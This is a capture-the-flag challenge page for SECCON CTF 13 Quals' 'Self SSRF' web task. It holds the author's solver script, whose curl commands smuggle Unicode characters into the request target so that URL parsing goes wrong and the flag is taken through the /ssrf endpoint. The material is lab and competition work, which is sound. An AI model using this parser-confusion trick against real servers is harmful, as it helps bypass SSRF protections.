---
title: "Self SSRF - SECCON CTF 13 Quals 2024"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "ssrf", "self", "web", "seccon-ctf-13-quals"]
summary: "Guess the flag, or abuse the /ssrf endpoint."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/self-ssrf"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "Self SSRF"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/self-ssrf>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [web] self-ssrf

## Description

Guess the flag, or abuse the `/ssrf` endpoint.

- Challenge: `http://self-ssrf.seccon.games:3000`

## Attachments

- [self-ssrf](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.sh`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/web/self-ssrf/solver/exploit.sh>

```bash
#!/usr/bin/env bash

# curl "http://${SECCON_HOST:-localhost}:3000" --request-target "$(echo -en "/ssrf?flag\u00a0")"
curl "http://${SECCON_HOST:-localhost}:3000" --request-target "$(echo -en "/ssrf?flag\ufeff")"
# curl "http://${SECCON_HOST:-localhost}:3000" --request-target "$(echo -en "http://${SECCON_HOST:-localhost}:3000/ssrf?flag\u2000")"


# ref:
# https://github.com/pillarjs/parseurl/blob/1.3.3/index.js#L95-L142
# https://github.com/oven-sh/bun/blob/bun-v1.1.36/src/node-fallbacks/url.js#L166-L168
```
